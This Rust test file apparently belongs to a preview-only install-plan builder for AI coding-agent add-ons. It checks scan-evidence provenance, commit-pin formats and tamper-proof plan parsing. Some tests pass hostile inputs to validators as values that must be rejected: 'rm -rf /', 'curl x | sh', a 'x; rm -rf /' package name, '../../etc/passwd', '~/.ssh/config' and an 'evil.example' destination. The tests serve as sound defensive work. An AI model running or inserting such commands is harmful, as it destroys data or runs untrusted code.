        .find(|o| o.subject == "agent:claude-code" && o.method == "path-executable" && o.presence == "present")
        .expect("a present Claude Code observation")
}

#[test]
fn an_agent_seen_in_an_earlier_scan_is_unknown_when_the_latest_scan_was_not_allowed_to_look() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("a", "r");
    m.program("claude", platform);
    m.scan(&conn, platform);
    let r = claude_request(platform);
    assert_eq!(state_of(&plan(&conn, &r, &host(platform)), "agent_present"), ("met".into(), "current_scan".into()));
    // the next scan is allowed to read user files only: the PATH area was NOT checked
    let auth = Authorization { path_executables: false, user_config: true, project: None, fingerprint_artifacts: false };
    discovery::run_scan(&conn, &m.roots(platform), &auth).unwrap();
    let p = plan(&conn, &r, &host(platform));
    assert_eq!(
        state_of(&p, "agent_present"),
        ("unknown".into(), "no_current_evidence".into()),
        "an old observation is not the latest scan finding it"
    );
    assert!(warning_codes(&p).contains(&"historical_presence_not_current"));
    assert!(codes(&p.eligibility.blockers).contains(&"agent_not_confirmed"));
    assert!(!p.prerequisites.iter().any(|x| x.id == "agent_present" && x.text.contains("bulunamadı")), "unchecked is not absent");
}

#[test]
fn an_agent_seen_earlier_and_missing_from_the_latest_authorised_scan_is_absent_not_present() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("b", "r");
    m.program("claude", platform);
    m.scan(&conn, platform);
    fs::remove_file(m.bin.join(if platform == PLATFORM_WINDOWS { "claude.exe" } else { "claude" })).unwrap();
    m.scan(&conn, platform);
    let p = plan(&conn, &claude_request(platform), &host(platform));
    assert_eq!(state_of(&p, "agent_present"), ("unmet".into(), "current_scan".into()));
    assert!(!warning_codes(&p).contains(&"historical_presence_not_current"), "the old row was replaced by the newer scan's answer");
}

#[test]
fn a_scan_that_was_not_authorised_to_look_never_produces_absence() {
    let platform = this_platform();
    let mut o = claude_observation(platform);
    o.presence = "absent".to_string();
    o.scan_authorized_path = false; // a (corrupt or forged) absent row from a scan without PATH permission
    let conn = seeded();
    let p = build_plan(&entry(&conn, "superpowers"), &claude_request(platform), &host(platform), &[o]).unwrap();
    assert_eq!(state_of(&p, "agent_present").0, "unknown");
}

#[test]
fn a_record_from_another_platform_is_disclosed_but_never_satisfies_the_target() {
    let windows_record = claude_observation(this_platform());
    let other = if this_platform() == PLATFORM_WINDOWS { MAC } else { WIN };
    let conn = seeded();
    let p = build_plan(&entry(&conn, "superpowers"), &claude_request(other), &host(other), std::slice::from_ref(&windows_record)).unwrap();
    assert_eq!(state_of(&p, "agent_present").0, "unknown");
    assert!(warning_codes(&p).contains(&"foreign_platform_record"));
    // the same record for its own platform is accepted (control)
    let p = build_plan(&entry(&conn, "superpowers"), &claude_request(this_platform()), &host(this_platform()), &[windows_record]).unwrap();
    assert_eq!(state_of(&p, "agent_present").0, "met");
}

#[test]
fn evidence_for_one_agent_surface_is_never_merged_into_another() {
    let platform = this_platform();
    let claude = claude_observation(platform);
    let conn = seeded();
    let ask = |surface: &str, obs: &[StoredObservation]| {
        let e = entry(&conn, "superpowers");
        build_plan(&e, &req("superpowers", platform, surface), &host(platform), obs).unwrap()
    };
    let met = |p: &InstallPlan| state_of(p, "agent_present").0;
    assert_eq!(met(&ask("claude-code-terminal", std::slice::from_ref(&claude))), "met");
    // Claude Desktop and the Antigravity surfaces have no evidence of their own here
    for surface in ["claude-desktop-code", "antigravity-ide", "antigravity-cli", "antigravity-2"] {
        assert_eq!(met(&ask(surface, std::slice::from_ref(&claude))), "unknown", "{surface} borrowed Claude Code evidence");
    }
    // a current Antigravity IDE record satisfies the IDE only, not the CLI or 2.0
    let mut ide = claude.clone();
    ide.subject = "agent:antigravity-ide".to_string();
    ide.agent_surface = "antigravity-ide".to_string();
    assert_eq!(met(&ask("antigravity-ide", &[ide.clone()])), "met");
    for surface in ["antigravity-cli", "antigravity-2", "claude-code-terminal"] {
        assert_eq!(met(&ask(surface, &[ide.clone()])), "unknown", "{surface} borrowed Antigravity IDE evidence");
    }
    // the right subject on the wrong surface label is also refused
    let mut mislabelled = claude.clone();
    mislabelled.agent_surface = "claude-desktop-code".to_string();
    let p = ask("claude-code-terminal", &[mislabelled]);
    assert_eq!(met(&p), "unknown");
    assert!(warning_codes(&p).contains(&"other_surface_record"));
}

#[test]
fn project_scope_evidence_is_used_only_for_that_project() {
    let platform = this_platform();
    let mut settings = claude_observation(platform);
    settings.method = "claude-settings-file".to_string();
    settings.scope = "project".to_string();
    settings.project_alias = Some("proje-a".to_string());
    settings.presence = "unknown".to_string();
    settings.configuration = "malformed".to_string();
    settings.scan_authorized_project = true;
    let conn = seeded();
    let ask = |scope: &str, alias: Option<&str>| {
        let r = PlanRequest { scope: scope.to_string(), project_alias: alias.map(str::to_string), ..claude_request(platform) };
        build_plan(&entry(&conn, "superpowers"), &r, &host(platform), &[settings.clone()]).unwrap()
    };
    assert_eq!(state_of(&ask("project", Some("proje-a")), "agent_config_readable"), ("unmet".into(), "current_scan".into()));
    assert_eq!(
        state_of(&ask("project", Some("proje-b")), "agent_config_readable").0,
        "unknown",
        "another project's file is not this project's"
    );
    assert_eq!(state_of(&ask("user", None), "agent_config_readable").0, "unknown", "a project file is not the user's file");
    // a project plan needs a valid alias, and a user plan must not carry one
    for r in [
        PlanRequest { scope: "project".to_string(), project_alias: None, ..claude_request(platform) },
        PlanRequest { scope: "project".to_string(), project_alias: Some("C:\\Users\\x".to_string()), ..claude_request(platform) },
        PlanRequest { scope: "user".to_string(), project_alias: Some("proje-a".to_string()), ..claude_request(platform) },
    ] {
        assert_eq!(plan_for(&conn, &r, &host(platform)).unwrap_err().code, "PLAN_REQUEST_INVALID");
    }
}

#[test]
fn stale_observations_do_not_count_and_are_only_history() {
    let platform = this_platform();
    let mut o = claude_observation(platform);
    o.current = false;
    o.stale = true;
    o.not_current_reason = Some("Son tarama 24 saatten eski; yeniden tarayın.".to_string());
    let conn = seeded();
    let p = build_plan(&entry(&conn, "superpowers"), &claude_request(platform), &host(platform), &[o]).unwrap();
    assert_eq!(state_of(&p, "agent_present"), ("unknown".into(), "no_current_evidence".into()));
    assert!(warning_codes(&p).contains(&"historical_presence_not_current"));
}

#[test]
fn current_evidence_wins_over_history_and_historical_versions_never_make_a_conflict() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("h", "r");
    m.program("gitleaks", platform);
    m.scan(&conn, platform);
    let now = discovery::store::latest_observations(&conn)
        .unwrap()
        .into_iter()
        .find(|o| o.subject == "gitleaks" && o.presence == "present")
        .unwrap();
    let mut current = now.clone();
    current.version = Some("1.0.0".to_string());
    let mut old_a = now.clone();
    old_a.current = false;
    old_a.version = Some("9.9.9".to_string());
    old_a.method = "native-install-location".to_string();
    let mut old_b = old_a.clone();
    old_b.version = Some("8.8.8".to_string());
    let e = entry(&conn, "gitleaks");
    let r = req("gitleaks", platform, "local-cli");
    let p = build_plan(&e, &r, &host(platform), &[current.clone(), old_a.clone(), old_b.clone()]).unwrap();
    let c: Vec<&str> = p.conflicts.iter().map(|c| c.code.as_str()).collect();
    assert!(c.contains(&"existing_installation_found"));
    assert!(!c.contains(&"conflicting_version_records"), "stale versions are history, not a conflict: {c:?}");
    // only history: no existing installation is claimed at all
    let p = build_plan(&e, &r, &host(platform), &[old_a, old_b]).unwrap();
    assert!(!p.conflicts.iter().any(|c| c.code.starts_with("existing_installation")));
    assert!(warning_codes(&p).contains(&"historical_presence_not_current"));
    // two CURRENT records with different versions do conflict
    let mut other = current.clone();
    other.version = Some("2.0.0".to_string());
    other.method = "native-install-location".to_string();
    let p = build_plan(&e, &r, &host(platform), &[current, other]).unwrap();
    assert!(p.conflicts.iter().any(|c| c.code == "conflicting_version_records"));
}

#[test]
fn only_current_copies_count_as_multiple_copies() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("mc", "r");
    m.program("gitleaks", platform);
    m.scan(&conn, platform);
    let base = discovery::store::latest_observations(&conn)
        .unwrap()
        .into_iter()
        .find(|o| o.subject == "gitleaks" && o.presence == "present")
        .unwrap();
    let mut said = base.clone();
    said.limitations.push("PATH içinde 2 farklı kopya bulundu; hangisinin kullanılacağı bilinmiyor.".to_string());
    let e = entry(&conn, "gitleaks");
    let r = req("gitleaks", platform, "local-cli");
    let current = build_plan(&e, &r, &host(platform), &[said.clone()]).unwrap();
    assert!(current.conflicts.iter().any(|c| c.code == "multiple_copies_found"));
    said.current = false;
    let historical = build_plan(&e, &r, &host(platform), &[said]).unwrap();
    assert!(!historical.conflicts.iter().any(|c| c.code == "multiple_copies_found"));
}

#[test]
fn consulting_history_changes_no_stored_record() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("hist", "r");
    m.program("claude", platform);
    m.scan(&conn, platform);
    let auth = Authorization { path_executables: false, user_config: true, project: None, fingerprint_artifacts: false };
    discovery::run_scan(&conn, &m.roots(platform), &auth).unwrap();
    let before = dump(&conn);
    let _ = plan(&conn, &claude_request(platform), &host(platform));
    assert_eq!(dump(&conn), before);
    assert!(crate::audit::verify(&conn).unwrap().ok);
}

// ---- RT-2D-02: a source commit is a declared pin, validated strictly ---------------------------------------------------

fn pin_of(commit: Option<&str>) -> InstallPlan {
    let conn = seeded();
    let mut e = entry(&conn, "gitleaks");
    match commit {
        Some(c) => e.record["sourceSnapshot"]["immutableCommit"] = json!(c),
        None => e.record["sourceSnapshot"]["immutableCommit"] = Value::Null,
    }
    build_plan(&e, &req("gitleaks", WIN, "local-cli"), &host(WIN), &[]).unwrap()
}

#[test]
fn only_exact_lowercase_hex_of_the_right_length_is_a_declared_pin_and_even_that_is_not_proof_of_origin() {
    let hex40 = "0123456789abcdef0123456789abcdef01234567";
    let hex64 = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
    for ok in [hex40, hex64] {
        let p = pin_of(Some(ok));
        assert_eq!(p.entry.source_pin, "declared_unverified", "{ok}");
        let b = codes(&p.eligibility.blockers);
        assert!(!b.contains(&"source_not_pinned") && !b.contains(&"source_pin_malformed"), "{b:?}");
        assert!(b.contains(&"source_origin_unverified"), "a well-formed pin is only a declaration: {b:?}");
        assert!(b.contains(&"metadata_unreviewed") && b.contains(&"no_approved_recipe"));
        assert!(p.eligibility.blockers.iter().find(|x| x.code == "source_origin_unverified").unwrap().text.contains("yalnızca beyan"));
    }
    let bad: Vec<String> = vec![
        "g".repeat(40), // right length, not hex
        "z".repeat(64),
        hex40.to_uppercase(),                         // upper case is not the schema's form
        format!("{}A{}", &hex40[..19], &hex40[20..]), // mixed case
        format!("{} ", &hex40[..39]),                 // padded with a space
        format!(" {}", &hex40[..39]),
        format!("{}\n", &hex40[..39]),
        format!("{}x", &hex40[..39]),
        hex40[..39].to_string(), // wrong lengths
        format!("{hex40}0"),
        hex64[..63].to_string(),
        format!("{hex64}0"),
        String::new(),
        "0x".to_string() + &hex40[..38],
        "../../etc/passwd".to_string() + &"a".repeat(24),
        "é".repeat(20), // 40 bytes, not hex
    ];
    for b in bad {
        let p = pin_of(Some(&b));
        assert_eq!(p.entry.source_pin, "malformed", "{b:?}");
        let c = codes(&p.eligibility.blockers);
        assert!(c.contains(&"source_pin_malformed") && c.contains(&"source_not_pinned"), "{b:?}: {c:?}");
        assert!(!c.contains(&"source_origin_unverified"));
    }
    let none = pin_of(None);
    assert_eq!(none.entry.source_pin, "none");
    assert!(codes(&none.eligibility.blockers).contains(&"source_not_pinned"));
    // preview-only behaviour is unchanged for every case
    assert!(!pin_of(Some(hex40)).eligibility.can_execute);
}

#[test]
fn a_pin_pretending_to_be_reviewed_metadata_changes_nothing() {
    let conn = seeded();
    let mut e = entry(&conn, "gitleaks");
    e.record["sourceSnapshot"]["immutableCommit"] = json!("0123456789abcdef0123456789abcdef01234567");
    e.record["sourceSnapshot"]["revisionState"] = json!("immutable-commit");
    e.record["reviewState"] = json!("reviewed-and-attested");
    let p = build_plan(&e, &req("gitleaks", WIN, "local-cli"), &host(WIN), &[]).unwrap();
    assert!(
        codes(&p.eligibility.blockers).contains(&"metadata_unreviewed"),
        "the catalog column, not a record field, decides the review state"
    );
    assert!(codes(&p.eligibility.blockers).contains(&"source_origin_unverified"));
}

// ---- RT-2D-03: a parsed plan is checked against its own content ------------------------------------------------------

fn sample_plan(entry_id: &str, platform: &str, surface: &str) -> InstallPlan {
    let conn = seeded();
    let mut e = entry(&conn, entry_id);
    if entry_id == "superpowers" {
        e.plugin_identity = Some("superpowers".to_string());
    }
    build_plan(&e, &req(entry_id, platform, surface), &host(platform), &[]).unwrap()
}

fn reject(plan: &InstallPlan, f: &dyn Fn(&mut Value)) -> &'static str {
    let mut v = serde_json::to_value(plan).unwrap();
    f(&mut v);
    parse_plan(&v.to_string()).expect_err("a modified plan must not parse")
}

#[test]
fn a_valid_plan_round_trips_in_any_json_layout_and_the_id_is_stable() {
    for p in [
        sample_plan("codebase-memory-mcp", WIN, "local-cli"),
        sample_plan("superpowers", WIN, "claude-code-terminal"),
        sample_plan("graphify", MAC, "local-cli"),
    ] {
        let compact = serde_json::to_string(&p).unwrap();
        let pretty = serde_json::to_string_pretty(&p).unwrap();
        assert_eq!(parse_plan(&compact).unwrap(), p);
        assert_eq!(parse_plan(&pretty).unwrap(), p);
        // CRLF line endings and re-ordered keys are irrelevant to the digest
        assert_eq!(parse_plan(&pretty.replace('\n', "\r\n")).unwrap(), p);
        let mut v: Value = serde_json::from_str(&compact).unwrap();
        let reversed: serde_json::Map<String, Value> =
            v.as_object_mut().unwrap().iter().rev().map(|(k, x)| (k.clone(), x.clone())).collect();
        assert_eq!(parse_plan(&Value::Object(reversed).to_string()).unwrap(), p);
        assert_eq!(content_digest(&p).unwrap(), p.plan_id);
    }
}

#[test]
fn the_plan_id_of_a_fixed_input_is_the_same_on_every_platform() {
    // Built with injected host facts and no observations, so the result cannot depend on the machine running the test.
    let p = sample_plan("codebase-memory-mcp", WIN, "local-cli");
    assert_eq!(p.plan_id, GOLDEN_PLAN_ID, "the canonical plan content changed; if intended, update the pinned id");
}

const GOLDEN_PLAN_ID: &str = "85cd660145c34e05471facba07a6964b7df8fb6acedaa115e1a985c2c88dbdc5";

#[test]
fn modifying_the_plan_id_or_any_content_field_without_the_matching_id_is_rejected() {
    let p = sample_plan("superpowers", WIN, "claude-code-terminal");
    assert_eq!(reject(&p, &|v| v["planId"] = json!("0".repeat(64))), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["planId"] = json!("abc")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["planId"] = json!("")), "plan_id_does_not_match_content");
    // tool identity
    assert_eq!(reject(&p, &|v| v["entry"]["entryId"] = json!("other-tool")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["entry"]["displayName"] = json!("Something else")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["entry"]["source"] = json!("attacker/repo")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["entry"]["reviewState"] = json!("metadata-reviewed")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["entry"]["sourcePin"] = json!("malformed")), "plan_id_does_not_match_content");
    // platform and target
    assert_eq!(reject(&p, &|v| v["target"]["platformTarget"] = json!("macos-arm64")), "target_inconsistent");
    assert_eq!(reject(&p, &|v| v["target"]["agentSurface"] = json!("antigravity-ide")), "target_inconsistent");
    assert_eq!(reject(&p, &|v| v["target"]["platformTarget"] = json!("linux-x64")), "target_not_in_vocabulary");
    assert_eq!(reject(&p, &|v| v["target"]["scope"] = json!("machine")), "target_not_in_vocabulary");
    assert_eq!(reject(&p, &|v| v["target"]["catalogCompatibility"] = json!("verified")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["target"]["thisComputerMatches"] = json!(false)), "target_inconsistent");
    // prerequisites
    assert_eq!(reject(&p, &|v| v["prerequisites"][0]["state"] = json!("met")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["prerequisites"][0]["basis"] = json!("current_scan")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["prerequisites"] = json!([])), "plan_id_does_not_match_content");
    // network declarations
    assert_eq!(reject(&p, &|v| v["network"]["plannedUse"] = json!(false)), "network_inconsistent");
    assert_eq!(reject(&p, &|v| v["network"]["destinations"] = json!(["https://evil.example"])), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["steps"][0]["network"] = json!("no")), "step_effects_inconsistent");
    // blockers, rollback, text
    assert_eq!(reject(&p, &|v| v["eligibility"]["blockers"] = json!([])), "blockers_inconsistent");
    assert_eq!(reject(&p, &|v| v["rollback"]["text"] = json!("Geri alma var ve güvenilir.")), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["rollback"]["reliability"] = json!("tested")), "rollback_inconsistent");
    assert_eq!(reject(&p, &|v| v["unknowns"] = json!([])), "plan_id_does_not_match_content");
    assert_eq!(reject(&p, &|v| v["plannerVersion"] = json!("9.9.9")), "unsupported_planner_version");
    assert_eq!(reject(&p, &|v| v["schemaVersion"] = json!(0)), "unsupported_schema_version");
}

#[test]
fn typed_operations_are_revalidated_against_their_kind_and_the_closed_schema_shape() {
    let p = sample_plan("superpowers", WIN, "claude-code-terminal");
    assert_eq!(p.steps[0].kind, OperationKind::RegisterNativePlugin);
    // payload edits
    assert_eq!(reject(&p, &|v| v["steps"][0]["typed"]["pluginId"] = json!("../../outside")), "typed_operation_invalid");
    assert_eq!(reject(&p, &|v| v["steps"][0]["typed"]["host"] = json!("antigravity-ide")), "typed_operation_invalid");
    assert_eq!(reject(&p, &|v| v["steps"][0]["typed"]["host"] = json!("emacs")), "typed_operation_invalid");
    assert_eq!(reject(&p, &|v| v["steps"][0]["typed"]["command"] = json!("rm -rf /")), "typed_operation_invalid");
    assert_eq!(
        reject(&p, &|v| {
            v["steps"][0]["typed"].as_object_mut().unwrap().remove("pluginId");
        }),
        "typed_operation_invalid"
    );
    assert_eq!(reject(&p, &|v| v["steps"][0]["typed"]["operation"] = json!("fetch-release-artifact")), "typed_operation_invalid");
    assert_eq!(reject(&p, &|v| v["steps"][0]["typed"] = json!("register-native-plugin")), "typed_operation_invalid");
    assert_eq!(reject(&p, &|v| v["steps"][0]["typed"] = json!({})), "typed_operation_invalid");
    // a typed operation next to missing parameters, and an untyped one that names none
    assert_eq!(reject(&p, &|v| v["steps"][0]["missingParameters"] = json!(["pluginId"])), "typed_operation_invalid");
    assert_eq!(
        reject(&p, &|v| {
            v["steps"][0]["typed"] = Value::Null;
        }),
        "untyped_step_without_missing_parameters"
    );
    // kind / summary agreement
    assert_eq!(reject(&p, &|v| v["steps"][0]["kind"] = json!("install-pinned-package")), "step_text_not_from_vocabulary");
    assert_eq!(reject(&p, &|v| v["steps"][0]["kind"] = json!("run-shell")), "plan_not_readable");
    // unknown fields anywhere are refused instead of being dropped silently
    assert_eq!(reject(&p, &|v| v["approved"] = json!(true)), "plan_not_readable");
    assert_eq!(reject(&p, &|v| v["steps"][0]["command"] = json!("curl x | sh")), "plan_not_readable");
    assert_eq!(reject(&p, &|v| v["eligibility"]["approval"] = json!({ "actorType": "user" })), "plan_not_readable");

    let archive = sample_plan("codebase-memory-mcp", WIN, "local-cli");
    assert_eq!(archive.steps.len(), 4);
    // operation payloads of every kind
    assert_eq!(reject(&archive, &|v| v["steps"][0]["typed"]["artifactId"] = json!("secondary")), "typed_operation_invalid");
    assert_eq!(reject(&archive, &|v| v["steps"][2]["typed"]["destinationId"] = json!("/tmp/anywhere")), "typed_operation_invalid");
    assert_eq!(reject(&archive, &|v| v["steps"][3]["typed"]["activationMethod"] = json!("overwrite")), "typed_operation_invalid");
    assert_eq!(reject(&archive, &|v| v["steps"][3]["typed"]["activationSlot"] = json!("C:/Windows")), "typed_operation_invalid");
    // the verify step has no digest: giving it a typed form with a made-up digest is a change of content, and a bad digest is invalid
    assert_eq!(
        reject(&archive, &|v| {
            v["steps"][1]["typed"] = json!({ "operation": "verify-artifact-digest", "artifactId": "primary", "expectedSha256": "XYZ" });
            v["steps"][1]["missingParameters"] = json!([]);
        }),
        "typed_operation_invalid"
    );
    // step order and index
    assert_eq!(
        reject(&archive, &|v| {
            let a = v["steps"][0].clone();
            let b = v["steps"][3].clone();
            v["steps"][0] = b;
            v["steps"][3] = a;
        }),
        "step_order_not_a_known_template"
    );
    assert_eq!(
        reject(&archive, &|v| {
            v["steps"].as_array_mut().unwrap().remove(1);
        }),
        "step_order_not_a_known_template"
    );
    assert_eq!(reject(&archive, &|v| v["steps"][2]["index"] = json!(9)), "step_index_inconsistent");
    assert_eq!(reject(&archive, &|v| v["steps"][3]["writeLabels"] = json!(["Kullanıcının belgeler klasörü"])), "step_effects_inconsistent");
    // chosen method that is not one of the declared supported methods
    assert_eq!(reject(&archive, &|v| v["chosenMethod"] = json!("curl-pipe-sh")), "method_inconsistent");
}

#[test]
fn every_operation_kind_payload_that_the_schema_allows_is_accepted_only_in_its_exact_shape() {
    let ok = |kind, v: Value| typed_is_valid(kind, &v, "claude-code-terminal");
    let sha = "a".repeat(64);
    assert!(ok(OperationKind::FetchReleaseArtifact, json!({ "operation": "fetch-release-artifact", "artifactId": "primary" })));
    assert!(ok(
        OperationKind::VerifyArtifactDigest,
        json!({ "operation": "verify-artifact-digest", "artifactId": "primary", "expectedSha256": sha })
    ));
    assert!(ok(
        OperationKind::StagePrivateCopy,
        json!({ "operation": "stage-private-copy", "artifactId": "primary", "destinationId": "manager-owned-staging" })
    ));
    assert!(ok(
        OperationKind::ActivateStagedArtifact,
        json!({ "operation": "activate-staged-artifact", "artifactId": "primary", "activationSlot": "native-plugin-manager", "activationMethod": "host-native-registration" })
    ));
    assert!(ok(
        OperationKind::InstallPinnedPackage,
        json!({ "operation": "install-pinned-package", "packageManager": "uv-tool", "packageName": "graphifyy", "version": "0.9.84", "lifecycleScripts": "disabled" })
    ));
    assert!(ok(
        OperationKind::RegisterNativePlugin,
        json!({ "operation": "register-native-plugin", "host": "claude-code-terminal", "pluginId": "superpowers" })
    ));
    assert!(ok(
        OperationKind::WriteManagedInstructionBlock,
        json!({ "operation": "write-managed-instruction-block", "instructionTarget": "CLAUDE.md", "templateId": "tool-discovery-pointer" })
    ));
    // lifecycle scripts can never be enabled; free-form targets and templates do not exist
    assert!(!ok(
        OperationKind::InstallPinnedPackage,
        json!({ "operation": "install-pinned-package", "packageManager": "uv-tool", "packageName": "x", "version": "1", "lifecycleScripts": "enabled" })
    ));
    assert!(!ok(
        OperationKind::InstallPinnedPackage,
        json!({ "operation": "install-pinned-package", "packageManager": "pip", "packageName": "x", "version": "1", "lifecycleScripts": "disabled" })
    ));
    assert!(!ok(
        OperationKind::InstallPinnedPackage,
        json!({ "operation": "install-pinned-package", "packageManager": "uv-tool", "packageName": "x; rm -rf /", "version": "1", "lifecycleScripts": "disabled" })
    ));
    assert!(!ok(
        OperationKind::WriteManagedInstructionBlock,
        json!({ "operation": "write-managed-instruction-block", "instructionTarget": "~/.ssh/config", "templateId": "tool-discovery-pointer" })
    ));
    assert!(!ok(
        OperationKind::WriteManagedInstructionBlock,
        json!({ "operation": "write-managed-instruction-block", "instructionTarget": "CLAUDE.md", "templateId": "my own text" })
    ));
    assert!(!ok(OperationKind::VerifyArtifactDigest, json!({ "operation": "verify-artifact-digest", "artifactId": "primary" })));
    assert!(!ok(
        OperationKind::FetchReleaseArtifact,
        json!({ "operation": "fetch-release-artifact", "artifactId": "primary", "url": "https://x" })
    ));
}

#[test]
fn a_hash_is_not_an_authorization_and_a_recomputed_id_still_cannot_make_a_plan_executable() {
    let p = sample_plan("superpowers", WIN, "claude-code-terminal");
    // someone edits a harmless display field and recomputes the id: it parses (a hash is not a MAC) and proves nothing about approval
    let mut v = serde_json::to_value(&p).unwrap();
    v["entry"]["displayName"] = json!("Edited name");
    let mut edited: InstallPlan = serde_json::from_value(v).unwrap();
    edited.plan_id = content_digest(&edited).unwrap();
    let parsed = parse_plan(&serde_json::to_string(&edited).unwrap()).unwrap();
    assert!(!parsed.executable && !parsed.executed && parsed.state == "preview_only" && !parsed.eligibility.can_execute);
    // …but no recomputed id can turn a preview into an executable / approved / eligible one
    for f in [
        (|x: &mut InstallPlan| x.executable = true) as fn(&mut InstallPlan),
        |x| x.executed = true,
        |x| x.modifies_anything = true,
        |x| x.state = "approved".to_string(),
        |x| x.eligibility.can_execute = true,
        |x| x.eligibility.status = "ready".to_string(),
        |x| x.rollback.available = true,
        |x| x.network.used_to_build_preview = true,
        |x| x.statement = "Onaylandı.".to_string(),
    ] {
        let mut forged = p.clone();
        f(&mut forged);
        forged.plan_id = content_digest(&forged).unwrap();
        assert!(parse_plan(&serde_json::to_string(&forged).unwrap()).is_err());
    }
    // the plan type carries no approval, user or recipe-digest field at all
    let text = serde_json::to_string(&p).unwrap();
    for field in ["\"approval\"", "approvedAt", "authorizedRecipeDigest", "authorizationState", "approvalId"] {
        assert!(!text.contains(field), "{field}");
    }
}

// =====================================================================================================================
// Phase 3A: Issue #12 — positive evidence needs the same provenance as negative evidence
// =====================================================================================================================

fn met(p: &InstallPlan) -> String {
    state_of(p, "agent_present").0
}

fn plan_with(o: StoredObservation) -> InstallPlan {
    let platform = this_platform();
    let conn = seeded();
    build_plan(&entry(&conn, "superpowers"), &claude_request(platform), &host(platform), &[o]).unwrap()
}

#[test]
fn a_present_record_that_contradicts_its_own_scan_permissions_is_never_evidence() {
    let platform = this_platform();
    let good = claude_observation(platform);
    assert_eq!(met(&plan_with(good.clone())), "met", "control: a normal record from a real scan");
    type Forge = fn(&mut StoredObservation);
    let forgeries: Vec<(&str, Forge)> = vec![
        ("path scan was not authorised", |o| o.scan_authorized_path = false),
        ("the latest scan did not check this area", |o| o.latest_scan_checked = false),
        ("not from the latest scan, only flagged current", |o| o.provenance = "earlier_scan".to_string()),
        ("both permission and checked flags missing", |o| {
            o.scan_authorized_path = false;
            o.latest_scan_checked = false;
        }),
    ];
    for (name, forge) in forgeries {
        let mut o = good.clone();
        forge(&mut o);
        assert!(o.current, "the forged row still claims to be current");
        let p = plan_with(o);
        assert_eq!(state_of(&p, "agent_present"), ("unknown".into(), "no_current_evidence".into()), "{name}");
        assert!(warning_codes(&p).contains(&"inconsistent_observation_ignored"), "{name}: {:?}", warning_codes(&p));
        assert!(codes(&p.eligibility.blockers).contains(&"agent_not_confirmed"), "{name}");
    }
    // wrong scope / wrong surface / wrong platform for an otherwise perfect row
    let mut project_scoped = good.clone();
    project_scoped.scope = "project".to_string();
    project_scoped.project_alias = Some("proje-a".to_string());
    assert_eq!(met(&plan_with(project_scoped)), "unknown");
    let mut other_surface = good.clone();
    other_surface.agent_surface = "antigravity-ide".to_string();
    assert_eq!(met(&plan_with(other_surface)), "unknown");
    let mut other_platform = good.clone();
    other_platform.platform_target = if platform == WIN { MAC } else { WIN }.to_string();
    assert_eq!(met(&plan_with(other_platform)), "unknown");
}

#[test]
fn a_user_config_record_needs_the_user_config_permission_and_a_project_record_the_project_permission() {
    let platform = this_platform();
    let mut settings = claude_observation(platform);
    settings.method = "claude-settings-file".to_string();
    settings.presence = "unknown".to_string();
    settings.configuration = "configured".to_string();
    settings.scan_authorized_user_config = true;
    let conn = seeded();
    let cfg = |o: StoredObservation| {
        let p = build_plan(&entry(&conn, "superpowers"), &claude_request(platform), &host(platform), &[o]).unwrap();
        state_of(&p, "agent_config_readable").0
    };
    assert_eq!(cfg(settings.clone()), "met");
    let mut no_permission = settings.clone();
    no_permission.scan_authorized_user_config = false;
    assert_eq!(cfg(no_permission), "unknown");
    let mut unchecked = settings.clone();
    unchecked.latest_scan_checked = false;
    assert_eq!(cfg(unchecked), "unknown");
}

#[test]
fn the_store_itself_does_not_call_a_latest_scan_row_current_when_the_scan_had_no_permission() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("forge", "r");
    m.program("claude", platform);
    m.scan(&conn, platform);
    let find = |c: &Connection| {
        discovery::store::latest_observations(c)
            .unwrap()
            .into_iter()
            .find(|o| o.subject == "agent:claude-code" && o.method == "path-executable")
            .unwrap()
    };
    assert!(find(&conn).current, "control");
    // history stays intact, but the latest scan's own record of its permissions now contradicts the PATH row
    conn.execute("UPDATE discovery_scans SET authorized_path = 0", []).unwrap();
    let after = find(&conn);
    assert!(!after.current && !after.latest_scan_checked, "{after:?}");
    assert!(after.not_current_reason.as_deref().unwrap_or("").contains("iznine sahip değildi"));
    assert_eq!(after.presence, "present", "the record is kept, not rewritten");
    let p = build_plan(
        &entry(&conn, "superpowers"),
        &claude_request(platform),
        &host(platform),
        &discovery::store::latest_observations(&conn).unwrap(),
    )
    .unwrap();
    assert_eq!(met(&p), "unknown");
}

#[test]
fn a_project_alias_must_name_a_registered_project() {
    let platform = this_platform();
    let conn = seeded();
    let ask = |alias: &str| {
        let r = PlanRequest { scope: "project".to_string(), project_alias: Some(alias.to_string()), ..claude_request(platform) };
        plan_for(&conn, &r, &host(platform))
    };
    // well-formed but unregistered
    assert_eq!(ask("proje-yok").unwrap_err().code, "PLAN_REQUEST_INVALID");
    crate::projects::add_reference(&conn, "benim-projem", "Benim projem", "").unwrap();
    assert!(ask("benim-projem").is_ok());
    // removed projects no longer count
    crate::projects::remove_reference(&conn, "benim-projem").unwrap();
    assert_eq!(ask("benim-projem").unwrap_err().code, "PLAN_REQUEST_INVALID");
    assert!(crate::projects::is_registered(&conn, "ornek-web-sitesi"));
    assert!(!crate::projects::is_registered(&conn, "ornek-web-sitesi-yok"));
}
